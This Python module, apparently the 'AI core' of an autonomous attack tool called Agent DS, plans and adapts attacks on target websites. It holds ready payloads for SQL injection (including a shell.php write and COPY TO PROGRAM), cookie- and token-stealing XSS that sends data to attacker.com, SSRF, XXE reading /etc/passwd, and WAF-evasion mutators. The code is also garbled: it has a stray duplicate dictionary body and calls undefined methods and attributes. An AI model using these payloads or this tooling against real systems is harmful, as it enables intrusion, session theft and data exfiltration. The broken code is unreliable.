#!/usr/bin/env python3
"""
Agent DS - AI Core Engine
Advanced AI-powered adaptive attack sequencing and learning

This module provides the AI brain for the One-Click Attack system including:
- Adaptive attack sequencing based on target analysis
- Custom payload generation using machine learning
- Learning from past attack results
- Vulnerability correlation and prioritization
- LLM integration for advanced reasoning
- Attack chain optimization

Author: Agent DS Team
Version: 2.0
Date: September 16, 2025
"""

import asyncio
import json
import re
import time
import random
import hashlib
from typing import Dict, List, Set, Optional, Any, Tuple
from datetime import datetime, timedelta
import pickle
import os
from pathlib import Path

# Machine learning imports
try:
    import numpy as np
    import pandas as pd
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.metrics.pairwise import cosine_similarity
    import torch
    import torch.nn as nn
    from transformers import GPT2LMHeadModel, GPT2Tokenizer
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("Warning: ML libraries not available. AI features will be limited.")

# CVE and vulnerability data
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AIThinkingModel:
    """
    Advanced AI Thinking Model - Central intelligence for autonomous attack operations
    
    This is the brain of Agent DS that:
    - Analyzes targets and predicts optimal attack sequences
    - Generates dynamic payloads using LLM and transformer models
    - Makes real-time decisions based on attack feedback
    - Adapts methodology based on success/failure patterns
    - Manages workflow and coordinates all attack modules
    """
    
    def __init__(self, terminal_callback=None):
        self.knowledge_base_path = Path("./data/ai_knowledge_base.json")
        self.model_path = Path("./models/")
        self.training_data_path = Path("./data/training/")
        self.model_path.mkdir(exist_ok=True)
        self.training_data_path.mkdir(exist_ok=True)
        
        # Terminal callback for live updates
        self.terminal_callback = terminal_callback
        
        # Initialize knowledge base and mission context
        self.knowledge_base = self._load_knowledge_base()
        self.current_mission = {}
        self.attack_history = []
        self.thinking_state = "idle"
        
        # Initialize advanced AI models
        self.payload_generator = None
        self.vulnerability_classifier = None
        self.attack_sequence_optimizer = None
        self.success_predictor = None
        self.threat_intelligence = None
        
        if ML_AVAILABLE:
            self._initialize_advanced_models()
        
        # Enhanced attack patterns with success probability
        self.attack_patterns = {
            'sql_injection': {
                'success_indicators': ['mysql_fetch_array', 'ORA-', 'PostgreSQL', 'SQL syntax'],
                'failure_indicators': ['404', 'not found', 'access denied'],
                'base_score': 0.7,
                'time_weight': 0.3
            },
            'xss': {
                'success_indicators': ['<script>', 'alert(', 'document.cookie'],
                'failure_indicators': ['escaped', 'filtered', 'blocked'],
                'base_score': 0.6,
                'time_weight': 0.2
            },
            'ssrf': {
                'success_indicators': ['internal', 'localhost', 'metadata', 'aws'],
                'failure_indicators': ['connection refused', 'timeout', 'blocked'],
                'base_score': 0.5,
                'time_weight': 0.4
            },
            'ssti': {
                'success_indicators': ['49', '7*7', 'template', 'jinja'],
                'failure_indicators': ['syntax error', 'template not found'],
                'base_score': 0.4,
                'time_weight': 0.3
            }
        }
        
            'sql_injection': {
                'success_indicators': ['mysql_fetch_array', 'ORA-', 'PostgreSQL', 'SQL syntax', 'UNION', 'SELECT'],
                'failure_indicators': ['404', 'not found', 'access denied', 'WAF', 'filtered'],
                'base_score': 0.75,
                'time_weight': 0.3,
                'complexity': 'medium',
                'impact_level': 'critical',
                'required_conditions': ['user_input', 'database_backend'],
                'mutation_strategies': ['encoding', 'case_variation', 'comment_insertion', 'union_techniques'],
                'success_probability': 0.65
            },
            'xss': {
                'success_indicators': ['<script>', 'alert(', 'document.cookie', 'onerror=', 'javascript:'],
                'failure_indicators': ['escaped', 'filtered', 'blocked', 'CSP', 'sanitized'],
                'base_score': 0.6,
                'time_weight': 0.2,
                'complexity': 'low',
                'impact_level': 'medium',
                'required_conditions': ['user_input', 'output_reflection'],
                'mutation_strategies': ['encoding', 'tag_variation', 'event_handlers', 'polyglot_payloads'],
                'success_probability': 0.55
            },
            'ssrf': {
                'success_indicators': ['internal', 'localhost', 'metadata', 'aws', '169.254.169.254', 'curl'],
                'failure_indicators': ['connection refused', 'timeout', 'blocked', 'firewall'],
                'base_score': 0.5,
                'time_weight': 0.4,
                'complexity': 'high',
                'impact_level': 'high',
                'required_conditions': ['url_parameter', 'http_client'],
                'mutation_strategies': ['protocol_variation', 'encoding', 'redirect_chains', 'dns_rebinding'],
                'success_probability': 0.35
            },
            'ssti': {
                'success_indicators': ['49', '7*7', 'template', 'jinja', 'twig', '{{', 'class'],
                'failure_indicators': ['syntax error', 'template not found', 'sandboxed'],
                'base_score': 0.4,
                'time_weight': 0.3,
                'complexity': 'high',
                'impact_level': 'critical',
                'required_conditions': ['template_engine', 'user_input'],
                'mutation_strategies': ['syntax_variation', 'filter_bypass', 'class_exploration'],
                'success_probability': 0.25
            },
            'command_injection': {
                'success_indicators': ['uid=', 'root', 'whoami', 'ls', 'dir', 'ping'],
                'failure_indicators': ['command not found', 'permission denied', 'restricted'],
                'base_score': 0.7,
                'time_weight': 0.4,
                'complexity': 'medium',
                'impact_level': 'critical',
                'required_conditions': ['system_command', 'user_input'],
                'mutation_strategies': ['separator_variation', 'encoding', 'command_chaining'],
                'success_probability': 0.45
            },
            'file_inclusion': {
                'success_indicators': ['root:x:', '/etc/passwd', 'config.php', 'include'],
                'failure_indicators': ['file not found', 'permission denied', 'restricted'],
                'base_score': 0.55,
                'time_weight': 0.35,
                'complexity': 'medium',
                'impact_level': 'high',
                'required_conditions': ['file_parameter', 'include_function'],
                'mutation_strategies': ['path_traversal', 'encoding', 'wrapper_usage'],
                'success_probability': 0.4
            }
        }
        
        # Threat intelligence sources
        self.threat_intel_sources = {
            'cve_api': 'https://services.nvd.nist.gov/rest/json/cves/1.0',
            'exploitdb_api': 'https://www.exploit-db.com/api/v1',
            'otx_api': 'https://otx.alienvault.com/api/v1',
            'vulners_api': 'https://vulners.com/api/v3'
        }
        
        # Mission state tracking
        self.mission_state = {
            'current_phase': 'initialization',
            'target_analysis': {},
            'attack_plan': [],
            'execution_results': {},
            'adaptation_count': 0,
            'success_metrics': {}
        }
    
    async def think_and_plan(self, target_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        AI Thinking Model - Analyze target and create comprehensive attack plan
        """
        self.thinking_state = "analyzing_target"
        await self._log_thinking("🧠 AI THINKING: Analyzing target and generating attack strategy...")
        
        # Phase 1: Target Analysis
        target_analysis = await self._analyze_target_comprehensive(target_data)
        await self._log_thinking(f"📊 Target Profile: {target_analysis['risk_level']} risk, {len(target_analysis['attack_surface'])} vectors identified")
        
        # Phase 2: Threat Intelligence Gathering
        self.thinking_state = "gathering_intelligence"
        await self._log_thinking("🔍 Gathering threat intelligence and CVE data...")
        threat_intel = await self._gather_threat_intelligence(target_analysis)
        
        # Phase 3: Attack Sequence Optimization
        self.thinking_state = "optimizing_sequence"
        await self._log_thinking("⚡ Optimizing attack sequence using ML models...")
        attack_plan = await self._generate_optimal_attack_sequence(target_analysis, threat_intel)
        
        # Phase 4: Payload Pre-generation
        self.thinking_state = "generating_payloads"
        await self._log_thinking("🎯 Pre-generating custom payloads for identified attack vectors...")
        custom_payloads = await self._pre_generate_payloads(target_analysis, attack_plan)
        
        # Phase 5: Success Probability Calculation
        self.thinking_state = "calculating_probabilities"
        await self._log_thinking("📈 Calculating success probabilities and risk assessment...")
        success_predictions = await self._predict_attack_success(target_analysis, attack_plan)
        
        self.thinking_state = "ready"
        await self._log_thinking("✅ AI Planning Complete - Ready for autonomous execution")
        
        # Store mission context
        self.current_mission = {
            'target_analysis': target_analysis,
            'threat_intelligence': threat_intel,
            'attack_plan': attack_plan,
            'custom_payloads': custom_payloads,
            'success_predictions': success_predictions,
            'created_at': datetime.now().isoformat()
        }
        
        return self.current_mission
    
    async def _analyze_target_comprehensive(self, target_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Comprehensive target analysis using AI models
        """
        analysis = {
            'target_url': target_data.get('target_url', ''),
            'technologies': target_data.get('technologies', []),
            'attack_surface': [],
            'risk_level': 'unknown',
            'complexity_score': 0,
            'defense_indicators': [],
            'vulnerable_endpoints': []
        }
        
        # Technology-based risk assessment
        high_risk_techs = ['php', 'wordpress', 'drupal', 'joomla', 'apache', 'nginx', 'mysql', 'postgresql']
        risk_score = 0
        
        for tech in analysis['technologies']:
            if any(risky in tech.lower() for risky in high_risk_techs):
                risk_score += 10
                analysis['attack_surface'].append({
                    'type': 'technology',
                    'value': tech,
                    'risk_level': 'high',
                    'attack_vectors': self._get_tech_attack_vectors(tech)
                })
        
        # Port-based attack surface analysis
        ports = target_data.get('ports', [])
        for port_info in ports:
            port = port_info.get('port')
            service = port_info.get('service', '')
            
            if port in [80, 443, 8080, 8443]:  # Web services
                analysis['attack_surface'].append({
                    'type': 'web_service',
                    'port': port,
                    'service': service,
                    'attack_vectors': ['web_attacks', 'injection_attacks']
                })
            elif port in [3306, 5432, 1433, 1521]:  # Database services
                analysis['attack_surface'].append({
                    'type': 'database_service',
                    'port': port,
                    'service': service,
                    'attack_vectors': ['database_exploitation', 'credential_attacks']
                })
            elif port in [22, 23, 21]:  # Remote access
                analysis['attack_surface'].append({
                    'type': 'remote_access',
                    'port': port,
                    'service': service,
                    'attack_vectors': ['credential_brute_force', 'protocol_exploitation']
                })
        
        # Calculate overall risk level
        if risk_score >= 50:
            analysis['risk_level'] = 'critical'
        elif risk_score >= 30:
            analysis['risk_level'] = 'high'
        elif risk_score >= 15:
            analysis['risk_level'] = 'medium'
        else:
            analysis['risk_level'] = 'low'
        
        analysis['complexity_score'] = min(risk_score, 100)
        
        return analysis
    
    def _get_tech_attack_vectors(self, technology: str) -> List[str]:
        """
        Get relevant attack vectors for detected technology
        """
        tech = technology.lower()
        vectors = []
        
        if 'php' in tech:
            vectors.extend(['sql_injection', 'xss', 'file_inclusion', 'command_injection'])
        if 'mysql' in tech:
            vectors.extend(['sql_injection', 'database_exploitation'])
        if 'wordpress' in tech:
            vectors.extend(['plugin_vulnerabilities', 'admin_brute_force', 'sql_injection'])
        if 'apache' in tech:
            vectors.extend(['server_side_vulnerabilities', 'misconfigurations'])
        if 'javascript' in tech:
            vectors.extend(['xss', 'client_side_attacks'])
        
        return list(set(vectors))
    
    async def _gather_threat_intelligence(self, target_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """
        Gather threat intelligence from multiple sources
        """
        intel = {
            'cve_matches': [],
            'exploit_availability': [],
            'threat_actor_ttps': [],
            'recent_vulnerabilities': []
        }
        
        # Search for CVEs related to detected technologies
        for tech_info in target_analysis['attack_surface']:
            if tech_info['type'] == 'technology':
                tech_name = tech_info['value']
                cves = await self._search_cve_database([tech_name], [])
                intel['cve_matches'].extend(cves)
        
        # Check for recent high-impact vulnerabilities
        recent_vulns = await self._get_recent_vulnerabilities()
        intel['recent_vulnerabilities'] = recent_vulns
        
        return intel
    
    async def _generate_optimal_attack_sequence(self, target_analysis: Dict[str, Any], 
                                              threat_intel: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Generate optimal attack sequence using AI optimization
        """
        # Base attack sequence
        base_sequence = [
            {'phase': 'reconnaissance', 'priority': 1, 'estimated_time': 300},
            {'phase': 'vulnerability_analysis', 'priority': 2, 'estimated_time': 600},
            {'phase': 'web_attacks', 'priority': 3, 'estimated_time': 900},
            {'phase': 'database_exploitation', 'priority': 4, 'estimated_time': 700},
            {'phase': 'admin_login_testing', 'priority': 5, 'estimated_time': 800},
            {'phase': 'privilege_escalation', 'priority': 6, 'estimated_time': 600}
        ]
        
        # Optimize based on target analysis
        if target_analysis['risk_level'] == 'critical':
            # Prioritize high-impact attacks
            for phase in base_sequence:
                if phase['phase'] in ['web_attacks', 'database_exploitation']:
                    phase['priority'] -= 1
        
        # Add custom phases based on detected technologies
        custom_phases = []
        for surface in target_analysis['attack_surface']:
            if 'wordpress' in str(surface).lower():
                custom_phases.append({
                    'phase': 'wordpress_exploitation',
                    'priority': 3.5,
                    'estimated_time': 400,
                    'custom': True
                })
        
        # Merge and sort by priority
        all_phases = base_sequence + custom_phases
        all_phases.sort(key=lambda x: x['priority'])
        
        return all_phases
    
    async def _pre_generate_payloads(self, target_analysis: Dict[str, Any], 
                                   attack_plan: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """
        Pre-generate custom payloads for the target
        """
        payloads = {
            'sql_injection': [],
            'xss': [],
            'ssrf': [],
            'ssti': [],
            'command_injection': [],
            'file_inclusion': []
        }
        
        # Generate technology-specific payloads
        technologies = [tech['value'] for tech in target_analysis['attack_surface'] 
                       if tech['type'] == 'technology']
        
        for tech in technologies:
            tech_payloads = self._generate_tech_specific_payloads(tech)
            for attack_type, payload_list in tech_payloads.items():
                if attack_type in payloads:
                    payloads[attack_type].extend(payload_list)
        
        # Use ML payload generation if available
        if ML_AVAILABLE and self.payload_generator:
            ml_payloads = await self._generate_ml_payloads({'target_analysis': target_analysis})
            for attack_type, payload_list in ml_payloads.items():
                if attack_type in payloads:
                    payloads[attack_type].extend(payload_list)
        
        # Generate context-aware payloads
        context_payloads = await self._generate_context_aware_payloads(target_analysis)
        for attack_type, payload_list in context_payloads.items():
            if attack_type in payloads:
                payloads[attack_type].extend(payload_list)
        
        # Remove duplicates and limit payload count
        for attack_type in payloads:
            payloads[attack_type] = list(set(payloads[attack_type]))[:50]  # Limit to 50 per type
        
        return payloads
    
    async def _predict_attack_success(self, target_analysis: Dict[str, Any], 
                                    attack_plan: List[Dict[str, Any]]) -> Dict[str, float]:
        """
        Predict success probability for each attack phase
        """
        predictions = {}
        
        for phase in attack_plan:
            phase_name = phase['phase']
            base_probability = self.attack_patterns.get(phase_name, {}).get('success_probability', 0.3)
            
            # Adjust based on target complexity
            complexity_modifier = 1.0 - (target_analysis['complexity_score'] / 200)  # Reduce by complexity
            
            # Adjust based on technology stack
            tech_modifier = 1.0
            for surface in target_analysis['attack_surface']:
                if surface['type'] == 'technology':
                    # Increase probability for known vulnerable technologies
                    if any(vuln_tech in surface['value'].lower() 
                          for vuln_tech in ['php', 'wordpress', 'drupal']):
                        tech_modifier += 0.1
            
            final_probability = min(base_probability * complexity_modifier * tech_modifier, 0.95)
            predictions[phase_name] = round(final_probability, 3)
        
        return predictions
    
    async def _generate_context_aware_payloads(self, target_analysis: Dict[str, Any]) -> Dict[str, List[str]]:
        """
        Generate payloads based on target context and environment
        """
        context_payloads = {
            'sql_injection': [],
            'xss': [],
            'ssrf': [],
            'command_injection': []
        }
        
        target_url = target_analysis.get('target_url', '')
        domain = target_url.split('/')[2] if '//' in target_url else target_url
        
        # Generate domain-specific SSRF payloads
        context_payloads['ssrf'].extend([
            f"http://localhost/admin",
            f"http://127.0.0.1:8080/manager",
            f"http://internal.{domain}/api",
            f"file:///etc/hosts",
            f"gopher://127.0.0.1:3306/",
        ])
        
        # Generate context-aware XSS payloads
        context_payloads['xss'].extend([
            f"<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            f"<img src=x onerror=fetch('http://attacker.com/exfil?data='+btoa(document.innerHTML))>",
            f"<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>",  # Base64 encoded alert
        ])
        
        # Generate SQL injection payloads based on detected database types
        db_types = []
        for surface in target_analysis['attack_surface']:
            if surface['type'] == 'database_service':
                service = surface.get('service', '').lower()
                if 'mysql' in service:
                    db_types.append('mysql')
                elif 'postgres' in service:
                    db_types.append('postgresql')
                elif 'mssql' in service:
                    db_types.append('mssql')
        
        for db_type in db_types:
            if db_type == 'mysql':
                context_payloads['sql_injection'].extend([
                    "' UNION SELECT user(),database(),version()--",
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--"
                ])
            elif db_type == 'postgresql':
                context_payloads['sql_injection'].extend([
                    "'; SELECT version()--",
                    "' UNION SELECT current_user,current_database()--",
                    "'; COPY (SELECT '') TO PROGRAM 'id'--"
                ])
        
        return context_payloads
    
    async def real_time_adaptation(self, attack_result: Dict[str, Any], 
                                 current_payload: str, target_response: str) -> Dict[str, Any]:
        """
        Real-time adaptation based on attack feedback
        """
        self.thinking_state = "adapting"
        await self._log_thinking("🔄 AI ADAPTING: Analyzing attack result and generating new strategy...")
        
        adaptation = {
            'should_retry': False,
            'new_payload': None,
            'strategy_change': None,
            'confidence_adjustment': 0,
            'next_phase_recommendation': None
        }
        
        attack_type = attack_result.get('attack_type', '')
        success = attack_result.get('success', False)
        
        if not success:
            # Analyze failure patterns
            failure_analysis = await self._analyze_failure(target_response, attack_type)
            
            if failure_analysis['retryable']:
                # Generate mutated payload
                new_payload = await self._mutate_payload(current_payload, attack_type, failure_analysis)
                
                adaptation.update({
                    'should_retry': True,
                    'new_payload': new_payload,
                    'strategy_change': failure_analysis['recommended_strategy'],
                    'confidence_adjustment': -0.1
                })
                
                await self._log_thinking(f"🧬 Payload Mutation: {failure_analysis['failure_reason']} - Trying new approach")
            else:
                # Move to next attack vector
                adaptation.update({
                    'should_retry': False,
                    'next_phase_recommendation': 'next_vector',
                    'confidence_adjustment': -0.2
                })
                
                await self._log_thinking("⏭️ Attack vector exhausted - Moving to next approach")
        else:
            # Success - enhance and chain attacks
            chained_attack = await self._generate_chained_attack(attack_result)
            adaptation.update({
                'should_retry': False,
                'strategy_change': 'chain_attack',
                'next_phase_recommendation': chained_attack,
                'confidence_adjustment': 0.2
            })
            
            await self._log_thinking(f"🎯 Success! Generating chained attack: {chained_attack}")
        
        # Update mission state
        self.mission_state['adaptation_count'] += 1
        
        return adaptation
    
    async def _analyze_failure(self, response: str, attack_type: str) -> Dict[str, Any]:
        """
        Analyze failure patterns to determine adaptation strategy
        """
        analysis = {
            'failure_reason': 'unknown',
            'retryable': True,
            'recommended_strategy': 'mutation',
            'detected_defenses': []
        }
        
        response_lower = response.lower()
        
        # WAF detection
        waf_indicators = ['blocked', 'forbidden', 'waf', 'firewall', 'security', 'filtered']
        if any(indicator in response_lower for indicator in waf_indicators):
            analysis.update({
                'failure_reason': 'waf_detection',
                'retryable': True,
                'recommended_strategy': 'evasion',
                'detected_defenses': ['WAF']
            })
        
        # Input sanitization
        sanitization_indicators = ['escaped', 'sanitized', 'filtered', 'encoded']
        if any(indicator in response_lower for indicator in sanitization_indicators):
            analysis.update({
                'failure_reason': 'input_sanitization',
                'retryable': True,
                'recommended_strategy': 'encoding_bypass',
                'detected_defenses': ['Input Sanitization']
            })
        
        # Rate limiting
        rate_limit_indicators = ['too many', 'rate limit', 'slow down', '429']
        if any(indicator in response_lower for indicator in rate_limit_indicators):
            analysis.update({
                'failure_reason': 'rate_limiting',
                'retryable': True,
                'recommended_strategy': 'delay_increase',
                'detected_defenses': ['Rate Limiting']
            })
        
        # Authentication required
        auth_indicators = ['login', 'authenticate', 'unauthorized', '401', '403']
        if any(indicator in response_lower for indicator in auth_indicators):
            analysis.update({
                'failure_reason': 'authentication_required',
                'retryable': False,
                'recommended_strategy': 'credential_attack',
                'detected_defenses': ['Authentication']
            })
        
        return analysis
    
    async def _mutate_payload(self, original_payload: str, attack_type: str, 
                            failure_analysis: Dict[str, Any]) -> str:
        """
        Mutate payload based on failure analysis
        """
        mutation_strategy = failure_analysis.get('recommended_strategy', 'mutation')
        
        if mutation_strategy == 'evasion':
            # WAF evasion techniques
            if attack_type == 'sql_injection':
                return self._apply_sql_evasion(original_payload)
            elif attack_type == 'xss':
                return self._apply_xss_evasion(original_payload)
        
        elif mutation_strategy == 'encoding_bypass':
            # Encoding bypass techniques
            return self._apply_encoding_bypass(original_payload, attack_type)
        
        elif mutation_strategy == 'mutation':
            # Standard payload mutation
            return self._apply_standard_mutation(original_payload, attack_type)
        
        return original_payload  # Fallback
    
    def _apply_sql_evasion(self, payload: str) -> str:
        """Apply SQL injection WAF evasion techniques"""
        evasion_techniques = [
            lambda p: p.replace(' ', '/**/'),  # Comment-based space replacement
            lambda p: p.replace('UNION', 'uNiOn'),  # Case variation
            lambda p: p.replace('SELECT', 'sElEcT'),  # Case variation
            lambda p: p.replace("'", "\\x27"),  # Hex encoding
            lambda p: p.replace(' AND ', ' /*!50000AND*/ '),  # Version-specific comments
        ]
        
        technique = random.choice(evasion_techniques)
        return technique(payload)
    
    def _apply_xss_evasion(self, payload: str) -> str:
        """Apply XSS WAF evasion techniques"""
        evasion_techniques = [
            lambda p: p.replace('<script>', '<ScRiPt>'),  # Case variation
            lambda p: p.replace('alert', 'confirm'),  # Function variation
            lambda p: p.replace('(', '&#40;').replace(')', '&#41;'),  # HTML entity encoding
            lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoding
            lambda p: f"<svg onload={p.replace('<script>', '').replace('</script>', '')}>",  # Tag variation
        ]
        
        technique = random.choice(evasion_techniques)
        return technique(payload)
    
    def _apply_encoding_bypass(self, payload: str, attack_type: str) -> str:
        """Apply encoding bypass techniques"""
        import urllib.parse
        
        encoding_techniques = [
            lambda p: urllib.parse.quote(p),  # URL encoding
            lambda p: urllib.parse.quote_plus(p),  # URL+ encoding
            lambda p: ''.join(f'%{ord(c):02x}' for c in p),  # Manual hex encoding
            lambda p: p.encode('utf-8').hex(),  # Hex encoding
        ]
        
        technique = random.choice(encoding_techniques)
        return technique(payload)
    
    def _apply_standard_mutation(self, payload: str, attack_type: str) -> str:
        """Apply standard mutation techniques"""
        if attack_type == 'sql_injection':
            mutations = [
                payload.replace("'", '"'),  # Quote variation
                payload + ' --',  # Comment addition
                payload.replace('=', ' LIKE '),  # Operator change
                payload.upper(),  # Case change
            ]
        elif attack_type == 'xss':
            mutations = [
                payload.replace('alert', 'prompt'),  # Function change
                payload.replace('<script>', '<img onerror='),  # Tag change
                payload + ' // Comment',  # Comment addition
                payload.replace("'", '"'),  # Quote variation
            ]
        else:
            mutations = [payload.upper(), payload.lower(), payload.replace(' ', '+')]
        
        return random.choice(mutations)
    
    async def _generate_chained_attack(self, success_result: Dict[str, Any]) -> str:
        """
        Generate chained attack based on successful result
        """
        attack_type = success_result.get('attack_type', '')
        
        if attack_type == 'sql_injection':
            return 'database_extraction'
        elif attack_type == 'xss':
            return 'session_hijacking'
        elif attack_type == 'ssrf':
            return 'internal_network_scan'
        elif attack_type == 'command_injection':
            return 'privilege_escalation'
        else:
            return 'lateral_movement'
    
    async def _log_thinking(self, message: str):
        """
        Log AI thinking process to terminal if callback is available
        """
        if self.terminal_callback:
            await self.terminal_callback('thinking', message)
        else:
            print(f"[AI THINKING] {message}")
    
    async def get_next_attack_recommendation(self, current_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        Get AI recommendation for next attack based on current results
        """
        self.thinking_state = "recommending"
        await self._log_thinking("🎯 Analyzing current results and recommending next attack vector...")
        
        recommendation = {
            'recommended_phase': None,
            'priority_level': 'medium',
            'estimated_success': 0.5,
            'reasoning': '',
            'custom_payloads': []
        }
        
        # Analyze successful attacks for chaining opportunities
        successful_attacks = []
        for phase, results in current_results.items():
            if isinstance(results, dict) and results.get('vulnerable', False):
                successful_attacks.append(phase)
        
        if 'web_attacks' in successful_attacks:
            if current_results['web_attacks'].get('sql_injection', {}).get('vulnerable'):
                recommendation.update({
                    'recommended_phase': 'database_exploitation',
                    'priority_level': 'high',
                    'estimated_success': 0.8,
                    'reasoning': 'SQL injection found - high probability of database access',
                    'custom_payloads': await self._generate_db_exploitation_payloads(current_results)
                })
            elif current_results['web_attacks'].get('xss', {}).get('vulnerable'):
                recommendation.update({
                    'recommended_phase': 'session_hijacking',
                    'priority_level': 'medium',
                    'estimated_success': 0.6,
                    'reasoning': 'XSS found - session hijacking opportunity',
                    'custom_payloads': await self._generate_session_hijack_payloads()
                })
        
        if not successful_attacks:
            # No successful attacks yet - recommend different approach
            failed_phases = [phase for phase, results in current_results.items() 
                           if isinstance(results, dict) and not results.get('vulnerable', True)]
            
            if len(failed_phases) >= 2:
                recommendation.update({
                    'recommended_phase': 'alternative_vectors',
                    'priority_level': 'high',
                    'estimated_success': 0.4,
                    'reasoning': 'Multiple attack vectors failed - trying alternative approaches',
                    'custom_payloads': await self._generate_alternative_payloads(current_results)
                })
        
        await self._log_thinking(f"💡 Recommendation: {recommendation['recommended_phase']} ({recommendation['priority_level']} priority)")
        
        return recommendation
    
    async def _generate_db_exploitation_payloads(self, results: Dict[str, Any]) -> List[str]:
        """Generate database exploitation payloads based on SQL injection results"""
        payloads = []
        
        sql_results = results.get('web_attacks', {}).get('sql_injection', {})
        if sql_results.get('vulnerable'):
            # Extract database type from successful injection
            for vuln in sql_results.get('vulnerabilities', []):
                payload = vuln.get('payload', '')
                if 'mysql' in payload.lower():
                    payloads.extend([
                        "' UNION SELECT schema_name FROM information_schema.schemata--",
                        "' UNION SELECT table_name FROM information_schema.tables--",
                        "' UNION SELECT user,password FROM mysql.user--"
                    ])
                elif 'postgresql' in payload.lower():
                    payloads.extend([
                        "'; SELECT datname FROM pg_database--",
                        "'; SELECT tablename FROM pg_tables--",
                        "'; SELECT usename FROM pg_user--"
                    ])
        
        return payloads
    
    async def _generate_session_hijack_payloads(self) -> List[str]:
        """Generate session hijacking payloads"""
        return [
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://attacker.com/session?data='+localStorage.getItem('token'))>",
            "<script>fetch('http://attacker.com/hijack', {method:'POST', body:document.cookie})</script>"
        ]
    
    async def _generate_alternative_payloads(self, results: Dict[str, Any]) -> List[str]:
        """Generate alternative attack payloads when standard attacks fail"""
        alternative_payloads = [
            # Alternative SQL injection techniques
            "'; WAITFOR DELAY '00:00:05'--",  # Time-based blind SQL injection
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--",  # MSSQL specific
            "' OR pg_sleep(5)--",  # PostgreSQL time delay
            
            # Alternative XSS techniques
            "<details open ontoggle=alert(1)>",  # HTML5 XSS
            "<marquee onstart=alert(1)>",  # Marquee XSS
            "javascript:alert(document.domain)//",  # JavaScript protocol
            
            # NoSQL injection
            "'; return true; var x='",  # MongoDB injection
            "[$ne]=1",  # NoSQL not equal
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",  # LDAP wildcard injection
            
            # XML injection
            "<?xml version='1.0'?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            
            # Template injection alternatives
            "${7*7}",  # JSTL expression
            "#{7*7}",  # JSF expression
            "{{constructor.constructor('alert(1)')()}}",  # AngularJS sandbox escape
        ]
        
        return alternative_payloads
        
    def _load_knowledge_base(self) -> Dict[str, Any]:
        """Load AI knowledge base from disk"""
        if self.knowledge_base_path.exists():
            try:
                with open(self.knowledge_base_path, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        
        # Default knowledge base structure
        return {
            'successful_attacks': [],
            'failed_attacks': [],
            'target_patterns': {},
            'payload_effectiveness': {},
            'attack_chains': [],
            'vulnerability_correlations': {},
            'learned_patterns': {}
        }
    
    def _save_knowledge_base(self):
        """Save knowledge base to disk"""
        try:
            self.knowledge_base_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.knowledge_base_path, 'w') as f:
                json.dump(self.knowledge_base, f, indent=2, default=str)
        except Exception as e:
            print(f"Failed to save knowledge base: {e}")
    
    def _initialize_ml_models(self):
        """Initialize machine learning models"""
        if not ML_AVAILABLE:
            return
        
        try:
            # Initialize payload generator
            self.payload_generator = PayloadGenerator()
            
            # Initialize vulnerability classifier
            self.vulnerability_classifier = VulnerabilityClassifier()
            
            # Initialize attack sequence optimizer
            self.attack_sequence_optimizer = AttackSequenceOptimizer()
            
        except Exception as e:
            print(f"Failed to initialize ML models: {e}")
    
    async def search_vulnerabilities(self, target_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Search for vulnerabilities using multiple sources and AI analysis
        """
        vulnerabilities = []
        
        # Extract technology information
        technologies = target_data.get('technologies', [])
        services = []
        
        # Extract services from port scan
        ports_data = target_data.get('ports', [])
        for port_info in ports_data:
            service = port_info.get('service', 'unknown')
            version = port_info.get('version', '')
            services.append({
                'service': service,
                'version': version,
                'port': port_info.get('port')
            })
        
        # Search CVE database
        cve_vulns = await self._search_cve_database(technologies, services)
        vulnerabilities.extend(cve_vulns)
        
        # Search ExploitDB
        exploit_vulns = await self._search_exploit_database(technologies, services)
        vulnerabilities.extend(exploit_vulns)
        
        # AI-powered vulnerability prediction
        if ML_AVAILABLE and self.vulnerability_classifier:
            predicted_vulns = await self._predict_vulnerabilities(target_data)
            vulnerabilities.extend(predicted_vulns)
        
        # Correlate and rank vulnerabilities
        ranked_vulns = self._rank_vulnerabilities(vulnerabilities, target_data)
        
        return ranked_vulns[:20]  # Return top 20 vulnerabilities
    
    async def _search_cve_database(self, technologies: List[str], services: List[Dict]) -> List[Dict[str, Any]]:
        """Search CVE database for known vulnerabilities"""
        vulnerabilities = []
        
        # Search for each technology and service
        search_terms = technologies + [s['service'] for s in services]
        
        for term in search_terms[:10]:  # Limit API calls
            if term in self.cve_cache:
                vulnerabilities.extend(self.cve_cache[term])
                continue
            
            try:
                # Use NIST NVD API (example implementation)
                api_url = f"https://services.nvd.nist.gov/rest/json/cves/1.0"
                params = {
                    'keyword': term,
                    'resultsPerPage': 10,
                    'cvssV3Severity': 'HIGH'
                }
                
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: requests.get(api_url, params=params, timeout=10)
                )
                
                if response.status_code == 200:
                    data = response.json()
                    cve_items = data.get('result', {}).get('CVE_Items', [])
                    
                    term_vulns = []
                    for item in cve_items:
                        cve_data = item.get('cve', {})
                        impact = item.get('impact', {})
                        
                        vuln = {
                            'id': cve_data.get('CVE_data_meta', {}).get('ID', ''),
                            'description': self._extract_cve_description(cve_data),
                            'severity': self._extract_cvss_score(impact),
                            'source': 'CVE',
                            'technology': term,
